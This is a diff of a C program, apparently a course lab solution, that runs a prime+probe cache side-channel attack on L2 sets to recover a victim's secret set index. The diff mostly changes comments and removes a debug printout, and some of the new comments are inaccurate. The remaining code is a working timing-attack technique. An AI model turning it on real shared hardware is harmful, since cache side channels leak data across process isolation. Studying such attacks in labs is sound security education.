@@ -5,9 +5,9 @@
 
 #define BUFF_SIZE (1 << 21)
 #define NSESTS 1024
-#define NWAYS 8 // = L1 ways: fits L1, so no self-eviction to L3
+#define NWAYS 8 // L1 ways
 #define ROUNDS 200
-#define THRESHOLD 30 // between L2 hit (~22) and L3 hit (~38)
+#define THRESHOLD 30 // between L2(22) and L3(38)
 #define WAITCYCLES 2000
 
 // waits n cycles
@@ -35,12 +35,11 @@ int main()
 
     int flag = -1;
 
-    // TODO: Implement your attack here
+    // Implement your attack here
     // Target L2
 
-    // fixed random probe order, built once so rand() stays out of the hot
-    // loop and the prefetcher can't predict our access pattern
-    srand(time(NULL) ^ getpid());
+    // fisher yates shuffle
+    srand(time(NULL) ^ getpid()); // set seed
     int order[NWAYS];
     for (int k = 0; k < NWAYS; k++)
         order[k] = k;
@@ -54,33 +53,35 @@ int main()
 
     // count slow probes per L2 set over many rounds; only the victim's set
     // (= flag) has lines pushed out of L1 to L3, so it collects the most.
-    long score[NSESTS] = {0};
+    long score[NSESTS] = {0}; // 1024
 
     for (int r = 0; r < ROUNDS; r++)
     {
         for (int s = 0; s < NSESTS; s++)
         {
-            // lines for set s: same set bits (s << 6), different tag (k << 16)
+            // add set (s << 6)
             ADDR_PTR base = (ADDR_PTR)buf + ((ADDR_PTR)s << 6);
 
-            // prime: fill set s with our own lines (plain loads, low footprint)
+            // prime: for each set, have NWAYS different tag bits
+            // add tag (k << 16)
             for (int k = 0; k < NWAYS; k++)
                 *(volatile char *)(base + ((ADDR_PTR)order[k] << 16));
 
             wait(WAITCYCLES);
 
-            // probe: a slow line (>= L3) was evicted from L1 by the victim
+            // probe: attacker lines evicted to L3
+            // add tag (k << 16)
             for (int k = 0; k < NWAYS; k++)
             {
                 CYCLES t = measure_one_block_access_time(
                     base + ((ADDR_PTR)order[k] << 16));
                 if (t > THRESHOLD)
-                    score[s]++;
+                    score[s]++; // should add 4 times if slow
             }
         }
     }
 
-    // the slowest set is the one the victim keeps touching
+    // get max of score
     long best = -1;
     for (int s = 0; s < NSESTS; s++)
         if (score[s] > best)
@@ -88,17 +89,6 @@ int main()
             best = score[s];
             flag = s;
         }
-
-    // DEBUG: top-5 sets, so you can see if the flag stands out (stderr only)
-    for (int n = 0; n < 5; n++)
-    {
-        int b = 0;
-        for (int s = 0; s < NSESTS; s++)
-            if (score[s] > score[b])
-                b = s;
-        fprintf(stderr, "  set %4d : %ld\n", b, score[b]);
-        score[b] = -1;
-    }
 
     printf("Flag: %d\n", flag);
     return 0;
